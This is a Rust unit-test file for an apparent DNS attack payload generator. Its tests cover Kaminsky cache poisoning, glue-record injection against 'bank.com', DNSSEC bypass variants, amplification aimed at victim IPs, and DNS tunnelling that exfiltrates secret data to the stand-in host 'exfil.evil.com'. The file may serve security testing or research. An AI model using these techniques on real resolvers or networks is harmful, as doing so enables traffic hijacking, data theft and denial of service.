use super::dns_poison::*;
use std::net::Ipv4Addr;

#[test]
fn kaminsky_race_generates_valid_payload() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.kaminsky_race("example.com");

    assert_eq!(payload.technique, DnsPoisonTechnique::KaminskyRace);
    assert!(payload.target_domain.ends_with(".example.com"));
    assert_eq!(payload.record_type, DnsRecordType::A);
    assert!(payload.spoofed_data.contains("AUTHORITY"));
    assert!(payload.spoofed_data.contains("ns1.attacker.example"));
    assert_eq!(payload.ttl, 86400);
    assert_eq!(payload.source_port, Some(53));
    let txids = payload.transaction_ids.unwrap();
    assert_eq!(txids.len(), 256);
}

#[test]
fn kaminsky_race_random_prefix_differs() {
    let gen = DnsPoisonGenerator::new();
    let p1 = gen.kaminsky_race("example.com");
    let p2 = gen.kaminsky_race("example.com");
    assert_ne!(
        p1.target_domain, p2.target_domain,
        "random prefixes should differ across calls"
    );
}

#[test]
fn kaminsky_parameters_without_port_randomization() {
    let gen = DnsPoisonGenerator::new();
    let params = gen.kaminsky_parameters(false);

    assert_eq!(params.txid_space, 65536);
    assert!(!params.source_port_randomized);
    assert_eq!(params.effective_entropy_bits, 16);
    assert!(params.packets_needed_50pct > 0);
    assert!(params.packets_needed_99pct > params.packets_needed_50pct);
    assert!(params.estimated_seconds_at_1gbps > 0.0);
}

#[test]
fn kaminsky_parameters_with_port_randomization() {
    let gen = DnsPoisonGenerator::new();
    let params = gen.kaminsky_parameters(true);

    assert!(params.source_port_randomized);
    assert_eq!(params.effective_entropy_bits, 32);
    assert!(params.packets_needed_50pct > 65536);
}

#[test]
fn birthday_parameters_calculation() {
    let gen = DnsPoisonGenerator::new();
    let params = gen.birthday_parameters(300, 300);

    assert_eq!(params.txid_bits, 16);
    assert_eq!(params.simultaneous_queries, 300);
    assert_eq!(params.spoofed_responses_per_query, 300);
    assert!(params.collision_probability > 0.0);
    assert!(params.collision_probability <= 1.0);
    assert!(params.queries_for_50pct > 0);
    assert!(params.queries_for_99pct > params.queries_for_50pct);
}

#[test]
fn birthday_attack_payload() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.birthday_attack("target.org");

    assert_eq!(payload.technique, DnsPoisonTechnique::BirthdayAttack);
    assert_eq!(payload.target_domain, "target.org");
    assert!(payload.spoofed_data.contains("300"));
    assert!(payload.transaction_ids.unwrap().len() == 1024);
}

#[test]
fn glue_record_injection_payload() {
    let gen = DnsPoisonGenerator::new().with_attacker_ns("evil.ns.example".to_string());
    let payload = gen.glue_record_injection("bank.com");

    assert_eq!(payload.technique, DnsPoisonTechnique::GlueRecordInjection);
    assert!(payload.spoofed_data.contains("evil.ns.example"));
    assert!(payload.spoofed_data.contains("bank.com"));
    assert_eq!(payload.record_type, DnsRecordType::NS);
}

#[test]
fn zone_transfer_probe_payload() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.zone_transfer_probe("corp.local", "dns1.corp.local");

    assert_eq!(payload.technique, DnsPoisonTechnique::ZoneTransferProbe);
    assert!(payload.spoofed_data.contains("AXFR"));
    assert!(payload.spoofed_data.contains("dns1.corp.local"));
    assert_eq!(payload.record_type, DnsRecordType::SOA);
}

#[test]
fn dnssec_bypass_unsigned_delegation() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dnssec_bypass("test.com", DnssecBypassVariant::UnsignedDelegation);

    assert_eq!(
        payload.technique,
        DnsPoisonTechnique::DnssecBypass(DnssecBypassVariant::UnsignedDelegation)
    );
    assert!(payload.spoofed_data.contains("DS record"));
    assert!(payload.spoofed_data.contains("NODATA"));
}

#[test]
fn dnssec_bypass_algorithm_downgrade() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dnssec_bypass("test.com", DnssecBypassVariant::AlgorithmDowngrade);

    assert!(payload.spoofed_data.contains("RSASHA1"));
    assert!(payload.spoofed_data.contains("DNSKEY"));
}

#[test]
fn dnssec_bypass_expired_signature() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dnssec_bypass("test.com", DnssecBypassVariant::ExpiredSignature);

    assert!(payload.spoofed_data.contains("RRSIG"));
    assert!(payload.spoofed_data.contains("expir"));
}

#[test]
fn dnssec_bypass_nsec_walking() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dnssec_bypass("test.com", DnssecBypassVariant::NsecWalking);

    assert!(payload.spoofed_data.contains("NSEC"));
    assert!(payload.spoofed_data.contains("rainbow"));
}

#[test]
fn dns_tunnel_subdomain_encoding() {
    let gen = DnsPoisonGenerator::new();
    let data = b"SECRET_DATA_TO_EXFILTRATE";
    let payload = gen.dns_tunnel(data, DnsTunnelingMode::SubdomainEncoding);

    assert_eq!(
        payload.technique,
        DnsPoisonTechnique::DnsTunneling(DnsTunnelingMode::SubdomainEncoding)
    );
    assert_eq!(payload.record_type, DnsRecordType::A);
    assert!(payload.spoofed_data.contains("25 bytes"));
    assert_eq!(payload.ttl, 0);
}

#[test]
fn dns_tunnel_txt_channel() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dns_tunnel(b"test", DnsTunnelingMode::TxtRecordChannel);

    assert_eq!(payload.record_type, DnsRecordType::TXT);
    assert!(payload.spoofed_data.contains("TXT"));
}

#[test]
fn dns_tunnel_cname_chain() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dns_tunnel(b"bidirectional", DnsTunnelingMode::CnameChain);

    assert_eq!(payload.record_type, DnsRecordType::CNAME);
    assert!(payload.spoofed_data.contains("CNAME"));
    assert!(payload.spoofed_data.contains("Bidirectional"));
}

#[test]
fn dns_tunnel_null_record() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.dns_tunnel(b"\x00\x01\x02\xff", DnsTunnelingMode::NullRecord);

    assert_eq!(payload.record_type, DnsRecordType::ANY);
    assert!(payload.spoofed_data.contains("NULL"));
}

#[test]
fn amplification_any_query() {
    let gen = DnsPoisonGenerator::new();
    let victim = Ipv4Addr::new(203, 0, 113, 1);
    let payload = gen.amplification(victim, AmplificationType::AnyQuery);

    assert_eq!(
        payload.technique,
        DnsPoisonTechnique::Amplification(AmplificationType::AnyQuery)
    );
    assert!(payload.spoofed_data.contains("203.0.113.1"));
    assert!(payload.spoofed_data.contains("28-54x"));
    assert_eq!(payload.record_type, DnsRecordType::ANY);
}

#[test]
fn amplification_dnssec_signed() {
    let gen = DnsPoisonGenerator::new();
    let victim = Ipv4Addr::new(192, 0, 2, 1);
    let payload = gen.amplification(victim, AmplificationType::DnssecSigned);

    assert!(payload.spoofed_data.contains("44-100x"));
    assert!(payload.spoofed_data.contains("RRSIG"));
}

#[test]
fn amplification_edns0() {
    let gen = DnsPoisonGenerator::new();
    let victim = Ipv4Addr::new(10, 0, 0, 1);
    let payload = gen.amplification(victim, AmplificationType::Edns0LargeBuffer);

    assert!(payload.spoofed_data.contains("4096"));
    assert!(payload.spoofed_data.contains("EDNS0"));
}

#[test]
fn amplification_open_resolver() {
    let gen = DnsPoisonGenerator::new();
    let victim = Ipv4Addr::new(172, 16, 0, 1);
    let payload = gen.amplification(victim, AmplificationType::OpenResolver);

    assert!(payload.spoofed_data.contains("Recursive"));
    assert!(payload.spoofed_data.contains("open resolver"));
}

#[test]
fn cache_preload_race_payload() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.cache_preload("example.com", 120);

    assert_eq!(payload.technique, DnsPoisonTechnique::CachePreload);
    assert!(payload.spoofed_data.contains("120s"));
    assert!(payload.spoofed_data.contains("TTL expiry"));
    assert_eq!(payload.ttl, 86400);
}

#[test]
fn subdomain_delegation_payload() {
    let gen = DnsPoisonGenerator::new();
    let payload = gen.subdomain_delegation("corp.com", "internal");

    assert_eq!(payload.technique, DnsPoisonTechnique::SubdomainDelegation);
    assert_eq!(payload.target_domain, "internal.corp.com");
    assert!(payload.spoofed_data.contains("NS"));
    assert!(payload.spoofed_data.contains("attacker"));
}

#[test]
fn custom_attacker_ip() {
    let gen = DnsPoisonGenerator::new().with_attacker_ip(Ipv4Addr::new(192, 168, 1, 100));
    let payload = gen.kaminsky_race("test.com");

    assert!(payload.spoofed_data.contains("192.168.1.100"));
}

#[test]
fn custom_tunnel_domain() {
    let gen = DnsPoisonGenerator::new().with_tunnel_domain("exfil.evil.com".to_string());
    let payload = gen.dns_tunnel(b"data", DnsTunnelingMode::SubdomainEncoding);

    assert_eq!(payload.target_domain, "exfil.evil.com");
}

#[test]
fn full_suite_generates_all_techniques() {
    let gen = DnsPoisonGenerator::new();
    let payloads = gen.generate_full_suite("target.example.com");

    assert!(
        payloads.len() >= 18,
        "full suite should have at least 18 payloads, got {}",
        payloads.len()
    );

    let techniques: Vec<_> = payloads.iter().map(|p| &p.technique).collect();
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::KaminskyRace)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::BirthdayAttack)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::GlueRecordInjection)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::ZoneTransferProbe)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::CachePreload)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::SubdomainDelegation)));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::DnssecBypass(_))));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::DnsTunneling(_))));
    assert!(techniques
        .iter()
        .any(|t| matches!(t, DnsPoisonTechnique::Amplification(_))));
}

#[test]
fn dns_record_type_display() {
    assert_eq!(DnsRecordType::A.to_string(), "A");
    assert_eq!(DnsRecordType::AAAA.to_string(), "AAAA");
    assert_eq!(DnsRecordType::CNAME.to_string(), "CNAME");
    assert_eq!(DnsRecordType::MX.to_string(), "MX");
    assert_eq!(DnsRecordType::NS.to_string(), "NS");
    assert_eq!(DnsRecordType::TXT.to_string(), "TXT");
    assert_eq!(DnsRecordType::SOA.to_string(), "SOA");
    assert_eq!(DnsRecordType::SRV.to_string(), "SRV");
    assert_eq!(DnsRecordType::PTR.to_string(), "PTR");
    assert_eq!(DnsRecordType::ANY.to_string(), "ANY");
}

#[test]
fn default_generator() {
    let gen = DnsPoisonGenerator::default();
    let payload = gen.kaminsky_race("test.com");
    assert!(payload.spoofed_data.contains("10.13.37.1"));
}
